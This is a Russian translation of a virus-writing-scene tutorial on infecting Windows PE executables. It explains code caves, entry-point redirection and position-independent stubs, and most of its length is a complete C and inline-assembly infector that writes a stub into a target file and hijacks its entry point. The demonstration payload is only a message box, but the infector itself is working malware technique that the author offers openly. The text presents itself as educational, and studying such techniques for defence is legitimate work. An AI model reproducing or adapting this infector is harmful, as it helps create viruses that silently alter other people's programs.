---
layout: post
title: Детальный гайд по заражению PE
category: [translations]
tag: [windows, malware]
---

[Оригинал](https://vxug.fakedoma.in/papers/Detailed%20Guide%20To%20Pe%20Infection.txt)
 

 

Заражение PE файлов - тема, которую я всегда считал сомнительной. Изучая ее, я всегда упускал некоторые части пазла... В этой статье я попытаюсь прояснить этот вопрос и надеюсь, что она станет хорошей отправной точкой для тех, кто хочет узнать, как работают PE инфекторы. 

 

 

Хочу отметить, что я пишу эту статью с намерением обучить других. Вы можете начать свою деятельность с заражения PE файлов, но в конце концов я надеюсь, что вы перейдете к написанию средств защиты PE файлов и будете использовать полученные знания в позитивном и этическом ключе. Многому можно научиться в процессе разработки и внедрения таких инструментов. 

 

 

В большинстве своем я буду использовать язык Си и встроенный язык ассемблера и подразумеваю, что вы имеете как минимум опыт использования Си/языка ассемблера. 

 

 

Во-первых, что такое PE файл? Вы можете прочитать об этом по следующей ссылке: 

 

 

* [Portable_Executable](https://en.wikipedia.org/wiki/Portable_Executable) 

 

 

Во-вторых, что такое 'заражение PE файлов'? 

 

 

По моему мнению, заражение PE файлов — это просто метод добавления кода (вредоносного) в скомпилированный исполняемый файл, с сохранением прежней функциональности (это значит он должен работать так, как будто его не меняли). 

 

 

Конечно, чтобы заразить PE файл мы должны знать его структуру. Существует множество документов, описывающих ее. Я рекомендую вам взглянуть на следующие перед тем, как продолжите читать дальше: 

 

 

* [PECOFF](www.microsoft.com/whdc/system/platform/firmware/PECOFF.mspx) 

* [An In-Depth Look into the Win32 Portable Executable File Format, Part 1](https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/february/inside-windows-win32-portable-executable-file-format-in-detail) 

* [An In-Depth Look into the Win32 Portable Executable File Format, Part 2](https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/march/inside-windows-an-in-depth-look-into-the-win32-portable-executable-file-format-part-2) 

 

 

Типичная структура PE файла выглядит так: 

 

 
```
[MZ Header] 
[MZ Signature] 
[PE Headers] 
[PE Signature]
[IMAGE_FILE_HEADER] [IMAGE_OPTIONAL_HEADER] 
[Section Table] 
[Section 1] [Section 2] [Section n] 
```
 

 

Я не указал заголовок DOS, но это не так критично. Я не ставлю тут цель рассказать о внутренностях PE формата.  

 

 

Внутри IMAGE_OPTIONAL_HEADER у нас лежат указатели на различные каталоги данных. Эти каталоги обычно указывают, среди прочего, на таблицы Import и Relocation. Мы должны сохранить или перестроить эти каталоги сами, если хотим их уничтожить... Например, если вы шифруете секцию, которая содержит данные одной из директорий. 

 

 

Основная идея заражения PE - в начале вставить наш код в свободное место, поменять оригинальную точку входа, чтобы она указывала на наш код, выполнить его, и затем прыгнуть на оригинальную точку входа, чтобы PE работал так, как будто и не существовало нашего кода.  

 

 

Псевдокод этого алгоритма будет выглядеть так: 

 

 

* Открываем целевой файл 

* Проверяем наличие сигнатур MZ и PE 

* Ищем последовательность NULL байтов, от начала последней секции 

* Пишем наш код в найденное свободное место 

* Изменяем текущую точку входа на адрес нашего кода 

* Закрываем целевой файл 

 

 

Хочу обратить внимание, что сам код, который мы вставляем — это самая сложная часть заражения PE, почему вы поймете дальше. 

 

 

Теперь давайте начнем реализовывать наш псевдокод... 

 

 

Нам надо открыть файл и смаппить его (это упростит модификацию). Я не буду объяснять, что делает каждый вызов API, в этом вам поможет MSDN.  

 

 

Следующий кусок кода показывает, как это делается: 

 

 

 
```c
// PE Infecter by KOrUPt
#include 
#include 
 
#define bb(x) __asm _emit x
 
__declspec(naked) void StubStart()
{
    __asm{
        pushad  // сохраняем контекст нашего потока
        call GetBasePointer
        GetBasePointer: 
        pop ebp
        sub ebp, offset GetBasePointer // трюк для базонезависимости...
         
        push MB_OK
        lea  eax, [ebp+szTitle]
        push eax
        lea  eax, [ebp+szText]
        push eax
        push 0
        mov  eax, 0xCCCCCCCC
        call eax
     
        popad   // восстанавливаем контекст нашего потока
        push 0xCCCCCCCC // кладем на стек адрес оригинальной входной точки (здесь в примере - заглушка)
        retn    // retn используется, как jmp
         
        szText:
            bb('H') bb('e') bb('l') bb('l') bb('o') bb(' ') bb('W') bb('o') bb('r') bb('l') bb('d')
            bb(' ') bb('f') bb('r') bb('o') bb('m') bb(' ') bb('K') bb('O') bb('r') bb('U') bb('P') bb('t') bb(0)        
        szTitle:
            bb('O') bb('h') bb('a') bb('i') bb(0)
         
    }
}
void StubEnd(){}
 
// By Napalm
DWORD FileToVA(DWORD dwFileAddr, PIMAGE_NT_HEADERS pNtHeaders)
{
    PIMAGE_SECTION_HEADER lpSecHdr = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(IMAGE_NT_HEADERS));
    for(WORD wSections = 0; wSections < pNtHeaders->FileHeader.NumberOfSections; wSections++){
        if(dwFileAddr >= lpSecHdr->PointerToRawData){
            if(dwFileAddr < (lpSecHdr->PointerToRawData + lpSecHdr->SizeOfRawData)){
                dwFileAddr -= lpSecHdr->PointerToRawData;
                dwFileAddr += (pNtHeaders->OptionalHeader.ImageBase + lpSecHdr->VirtualAddress);
                return dwFileAddr; 
            }
        }
        
        lpSecHdr++;
    }
     
    return NULL;
}
 
int main(int argc, char* argv[]) 
{    
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeaders;
    PIMAGE_SECTION_HEADER pSection, pSectionHeader;
    HANDLE hFile, hFileMap;
    HMODULE hUser32;
    LPBYTE hMap;
 
    int i = 0, charcounter = 0;
    DWORD oepRva = 0, oep = 0, fsize = 0, writeOffset = 0, oepOffset = 0, callOffset = 0;
    unsigned char *stub;
     
    // вычисляем размер кода/стаба
    DWORD start  = (DWORD)StubStart;
    DWORD end    = (DWORD)StubEnd;
    DWORD stubLength = (end - start);
     
    if(argc != 2){
        printf("Usage: %s [file]\n", argv[0]);
        return 0;
    }
     
    // мапим файл
    hFile = CreateFile(argv[1], GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        printf("[-] Cannot open %s\n", argv[1]);
        return 0;
    }
     
    fsize = GetFileSize(hFile, 0);
    if(!fsize){
        printf("[-] Could not get files size\n");
        CloseHandle(hFile);
        return 0;
    }
     
    hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, fsize, NULL);
    if(!hFileMap){
        printf("[-] CreateFileMapping failed\n");
        CloseHandle(hFile);
        return 0;
    }
 
    hMap = (LPBYTE)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, fsize);
    if(!hMap){
        printf("[-] MapViewOfFile failed\n");
        CloseHandle(hFileMap);
        CloseHandle(hFile);
        return 0;
    }
     
    // проверяем сигнатуры
    pDosHeader = (PIMAGE_DOS_HEADER)hMap;
    if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE){
        printf("[-] DOS signature not found\n");
        goto cleanup;
    }
     
    pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)hMap + pDosHeader->e_lfanew);
    if(pNtHeaders->Signature != IMAGE_NT_SIGNATURE){
        printf("[-] NT signature not found\n");
        goto cleanup;
    }
     
    // берем заголовок последней секции...
    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)hMap + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    pSection = pSectionHeader;
    pSection += (pNtHeaders->FileHeader.NumberOfSections - 1);
     
    // сохраняем точку входа
    oep = oepRva = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    oep += (pSectionHeader->PointerToRawData) - (pSectionHeader->VirtualAddress);
     
    // определяем свободное место
    i = pSection->PointerToRawData;
    for(; i != fsize; i++){
        if((char *)hMap[i] == 0x00){
            if(charcounter++ == stubLength + 24){
                printf("[+] Code cave located @ 0x%08lX\n", i);
                writeOffset = i;
            }
        }else charcounter = 0;
    }
 
    if(charcounter == 0 || writeOffset == 0){
        printf("[-] Could not locate a big enough code cave\n");
        goto cleanup;
    }
     
    writeOffset -= stubLength;
     
    stub = (unsigned char *)malloc(stubLength + 1);
    if(!stub){
        printf("[-] Error allocating sufficent memory for code\n");
        goto cleanup;
    }
     
    // копируем код в буфер
    memcpy(stub, StubStart, stubLength);
     
    // определяем смещения до заглушек в коде
    for(i = 0, charcounter = 0; i != stubLength; i++){
        if(stub[i] == 0xCC){
            charcounter++;
            if(charcounter == 4 && callOffset == 0)
                callOffset = i - 3;
            else if(charcounter == 4 && oepOffset == 0)
                oepOffset = i - 3;
        }else charcounter = 0;
    }
     
    // проверяем их на валидность
    if(oepOffset == 0 || callOffset == 0){
        free(stub);
        goto cleanup;
    }
     
    hUser32 = LoadLibrary("User32.dll");
    if(!hUser32){
        free(stub);
        printf("[-] Could not load User32.dll");
        goto cleanup;
    }
     
    // подменяем заглушки реальными значениями
    *(u_long *)(stub + oepOffset) = (oepRva + pNtHeaders->OptionalHeader.ImageBase);
    *(u_long *)(stub + callOffset) = ((DWORD)GetProcAddress(hUser32, "MessageBoxA"));
    FreeLibrary(hUser32);
     
    // записываем код
    memcpy((PBYTE)hMap + writeOffset, stub, stubLength);
     
    // устанавливаем точку входа
    pNtHeaders->OptionalHeader.AddressOfEntryPoint = 
        FileToVA(writeOffset, pNtHeaders) - pNtHeaders->OptionalHeader.ImageBase;
     
    // устанавливаем размер секции
    pSection->Misc.VirtualSize += stubLength;
    pSection->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
     
    // очищаем
    printf("[+] Stub written!!\n[*] Cleaning up\n");
    free(stub);
     
    cleanup:
    FlushViewOfFile(hMap, 0);
    UnmapViewOfFile(hMap);
     
    SetFilePointer(hFile, fsize, NULL, FILE_BEGIN);
    SetEndOfFile(hFile);
    CloseHandle(hFileMap);
    CloseHandle(hFile);
    return 0;
}
```

Код выше объясняет всю суть способа... Надеюсь, вам понравилось читать. Я жду ваших комментариев и рецензий данной темы.

KOrUPt. 
